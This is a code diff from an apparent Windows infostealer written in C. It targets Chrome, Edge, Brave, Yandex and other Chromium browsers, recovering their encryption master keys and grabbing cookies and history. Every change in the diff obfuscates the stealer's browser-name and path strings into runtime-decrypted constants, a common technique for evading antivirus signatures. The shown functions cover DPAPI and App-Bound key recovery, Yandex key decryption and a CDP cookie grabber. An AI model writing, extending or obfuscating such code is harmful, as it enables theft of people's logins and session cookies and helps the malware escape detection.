@@ -146,13 +146,30 @@ typedef struct {
 
 typedef struct { HANDLE UniqueProcess; HANDLE UniqueThread; } MirCLIENT_ID;
 
-/* Browser executable stems (lowercase, no .exe) */
-static const char * const g_browser_stems[] = {
-    "chrome", "msedge", "brave", "opera", "vivaldi",
-    "chromium", "slimjet", "yandex", "iron", "falkon",
-    "seamonkey", "waterfox", "palemoon", "basilisk",
-    NULL
-};
+/* Browser executable stems (lowercase, no .exe) -- runtime-decrypted */
+static char _stem_buf[14][32];
+static const char *g_browser_stems[15]; /* 14 + NULL */
+static int _stems_ready;
+
+static void init_stems(void) {
+    if (_stems_ready) return;
+    enc_decrypt(enc_bp_stem_chrome,   ENC_BP_STEM_CHROME_LEN,   _stem_buf[0]);  g_browser_stems[0]  = _stem_buf[0];
+    enc_decrypt(enc_bp_stem_msedge,   ENC_BP_STEM_MSEDGE_LEN,   _stem_buf[1]);  g_browser_stems[1]  = _stem_buf[1];
+    enc_decrypt(enc_bp_stem_brave,    ENC_BP_STEM_BRAVE_LEN,    _stem_buf[2]);  g_browser_stems[2]  = _stem_buf[2];
+    enc_decrypt(enc_bp_stem_opera,    ENC_BP_STEM_OPERA_LEN,    _stem_buf[3]);  g_browser_stems[3]  = _stem_buf[3];
+    enc_decrypt(enc_bp_stem_vivaldi,  ENC_BP_STEM_VIVALDI_LEN,  _stem_buf[4]);  g_browser_stems[4]  = _stem_buf[4];
+    enc_decrypt(enc_bp_stem_chromium, ENC_BP_STEM_CHROMIUM_LEN, _stem_buf[5]);  g_browser_stems[5]  = _stem_buf[5];
+    enc_decrypt(enc_bp_stem_slimjet,  ENC_BP_STEM_SLIMJET_LEN,  _stem_buf[6]);  g_browser_stems[6]  = _stem_buf[6];
+    enc_decrypt(enc_bp_stem_yandex,   ENC_BP_STEM_YANDEX_LEN,   _stem_buf[7]);  g_browser_stems[7]  = _stem_buf[7];
+    enc_decrypt(enc_bp_stem_iron,     ENC_BP_STEM_IRON_LEN,     _stem_buf[8]);  g_browser_stems[8]  = _stem_buf[8];
+    enc_decrypt(enc_bp_stem_falkon,   ENC_BP_STEM_FALKON_LEN,   _stem_buf[9]);  g_browser_stems[9]  = _stem_buf[9];
+    enc_decrypt(enc_bp_stem_seamonkey,ENC_BP_STEM_SEAMONKEY_LEN,_stem_buf[10]); g_browser_stems[10] = _stem_buf[10];
+    enc_decrypt(enc_bp_stem_waterfox, ENC_BP_STEM_WATERFOX_LEN, _stem_buf[11]); g_browser_stems[11] = _stem_buf[11];
+    enc_decrypt(enc_bp_stem_palemoon, ENC_BP_STEM_PALEMOON_LEN, _stem_buf[12]); g_browser_stems[12] = _stem_buf[12];
+    enc_decrypt(enc_bp_stem_basilisk, ENC_BP_STEM_BASILISK_LEN, _stem_buf[13]); g_browser_stems[13] = _stem_buf[13];
+    g_browser_stems[14] = NULL;
+    _stems_ready = 1;
+}
 
 /* Case-insensitive wide-vs-narrow stem match (no ext) */
 static int _mir_stem_eq(const WCHAR *w, int wlen, const char *t) {
@@ -882,12 +899,22 @@ static int get_master_key(const char *base_path, unsigned char *key32) {
 
     /* Detect browser type from path for App-Bound COM GUIDs */
     AppBoundBrowser browser = APPBOUND_CHROME;
-    if (strstr(base_path, "Microsoft\\Edge") || strstr(base_path, "Microsoft/Edge"))
-        browser = APPBOUND_EDGE;
-    else if (strstr(base_path, "BraveSoftware"))
-        browser = APPBOUND_BRAVE;
-    else if (strstr(base_path, "AVAST Software"))
-        browser = APPBOUND_AVAST;
+    {
+        static char _cmp_edge[32], _cmp_brave[32], _cmp_avast[32];
+        static int _cmp_init;
+        if (!_cmp_init) {
+            enc_decrypt(enc_bp_cmp_edge,  ENC_BP_CMP_EDGE_LEN,  _cmp_edge);
+            enc_decrypt(enc_bp_cmp_brave, ENC_BP_CMP_BRAVE_LEN, _cmp_brave);
+            enc_decrypt(enc_bp_cmp_avast, ENC_BP_CMP_AVAST_LEN, _cmp_avast);
+            _cmp_init = 1;
+        }
+        if (strstr(base_path, _cmp_edge) || strstr(base_path, "Microsoft/Edge"))
+            browser = APPBOUND_EDGE;
+        else if (strstr(base_path, _cmp_brave))
+            browser = APPBOUND_BRAVE;
+        else if (strstr(base_path, _cmp_avast))
+            browser = APPBOUND_AVAST;
+    }
 
     /* ── Strategy 1: Standard DPAPI on encrypted_key ──────────── */
 
@@ -949,10 +976,23 @@ static int get_master_key(const char *base_path, unsigned char *key32) {
 
 
     /* ── Strategy: Yandex custom crypto (magic 0x20120108) ─────────────── */
-    if (strstr(base_path, "Yandex") || strstr(base_path, "yandex")) {
-        if (yandex_decrypt_key(ls_path, key32) == 0) {
-            free(ls_path);
-            return 0;
+    {
+        static char _cmp_yandex[16];
+        static char _cmp_yandex_lo[16];
+        static int _yandex_init;
+        if (!_yandex_init) {
+            enc_decrypt(enc_bp_cmp_yandex, ENC_BP_CMP_YANDEX_LEN, _cmp_yandex);
+            enc_decrypt(enc_bp_cmp_yandex, ENC_BP_CMP_YANDEX_LEN, _cmp_yandex_lo);
+            for (int _yi = 0; _cmp_yandex_lo[_yi]; _yi++)
+                if (_cmp_yandex_lo[_yi] >= 'A' && _cmp_yandex_lo[_yi] <= 'Z')
+                    _cmp_yandex_lo[_yi] += 32;
+            _yandex_init = 1;
+        }
+        if (strstr(base_path, _cmp_yandex) || strstr(base_path, _cmp_yandex_lo)) {
+            if (yandex_decrypt_key(ls_path, key32) == 0) {
+                free(ls_path);
+                return 0;
+            }
         }
     }
 
@@ -1388,6 +1428,7 @@ char **extract_chromium_history(const char *profile_path, size_t *count) {
 /* ── Collect from all Chromium browsers ──────────────────────── */
 
 CollectResult collect_chromium(const char *local_app_data, const char *roaming_app_data) {
+    init_stems();
     CollectResult result = {0};
 
     size_t browser_count;
@@ -1488,16 +1529,24 @@ CollectResult collect_chromium(const char *local_app_data, const char *roaming_a
 #ifdef ENABLE_CDP_GRABBER
     /* Find Chrome path for CDP extraction */
     for (size_t b = 0; b < browser_count; b++) {
-        if (strstr(browsers[b].name, "Chrome") && !strstr(browsers[b].name, "x86")) {
-            const char *app_data = browsers[b].use_roaming ? roaming_app_data : local_app_data;
-            char *chrome_base = path_join(app_data, browsers[b].path_suffix);
-            if (chrome_base && dir_exists(chrome_base)) {
-                char cdp_output[MAX_PATH];
-                snprintf(cdp_output, sizeof(cdp_output), "%s_cookies_cdp.txt", browsers[b].name);
-                cdp_grab_cookies(NULL, cdp_output);
+        {
+            static char _cmp_chrome[16];
+            static int _chrome_init;
+            if (!_chrome_init) {
+                enc_decrypt(enc_bp_cmp_chrome, ENC_BP_CMP_CHROME_LEN, _cmp_chrome);
+                _chrome_init = 1;
             }
-            free(chrome_base);
-            break;
+            if (strstr(browsers[b].name, _cmp_chrome) && !strstr(browsers[b].name, "x86")) {
+                const char *app_data = browsers[b].use_roaming ? roaming_app_data : local_app_data;
+                char *chrome_base = path_join(app_data, browsers[b].path_suffix);
+                if (chrome_base && dir_exists(chrome_base)) {
+                    char cdp_output[MAX_PATH];
+                    snprintf(cdp_output, sizeof(cdp_output), "%s_cookies_cdp.txt", browsers[b].name);
+                    cdp_grab_cookies(NULL, cdp_output);
+                }
+                free(chrome_base);
+                break;
+            }
         }
     }
 #endif
